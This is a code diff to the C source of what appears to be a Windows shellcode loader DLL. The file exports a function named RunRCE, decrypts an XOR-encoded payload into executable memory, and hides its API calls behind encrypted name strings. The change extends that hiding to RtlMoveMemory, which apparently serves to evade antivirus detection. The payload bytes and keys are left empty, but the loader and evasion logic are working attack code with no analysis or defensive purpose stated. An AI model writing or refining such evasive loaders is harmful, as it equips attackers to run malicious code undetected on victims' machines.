@@ -16,12 +16,14 @@ unsigned char s_va[] = { };
 unsigned char s_vp[] = { };
 unsigned char s_ct[] = { };
 unsigned char s_wfso[] = { };
+unsigned char s_rmm[] = { };
 
 unsigned int my_payload_len = sizeof(my_payload);
 unsigned int s_va_len = sizeof(s_va);
 unsigned int s_vp_len = sizeof(s_vp);
 unsigned int s_ct_len = sizeof(s_ct);
 unsigned int s_wfso_len = sizeof(s_wfso);
+unsigned int s_rmm_len = sizeof(s_rmm);
 
 char my_payload_key[] = "";
 char f_key[] = "";
@@ -30,6 +32,11 @@ LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocat
 BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+VOID (WINAPI * pRtlMoveMemory)(
+  _Out_       VOID UNALIGNED *Destination,
+  _In_  const VOID UNALIGNED *Source,
+  _In_        SIZE_T         Length
+);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -72,7 +79,9 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
     XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
     
     // Copy payload to allocated buffer
-    RtlMoveMemory(exec_mem, my_payload, my_payload_len);
+    XOR((char *) s_rmm, s_rmm_len, f_key, sizeof(f_key));
+    pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
+    pRtlMoveMemory(exec_mem, my_payload, my_payload_len);
 
     // decrypt XOR VirtualProtect
     XOR((char *) s_vp, s_vp_len, f_key, sizeof(f_key));
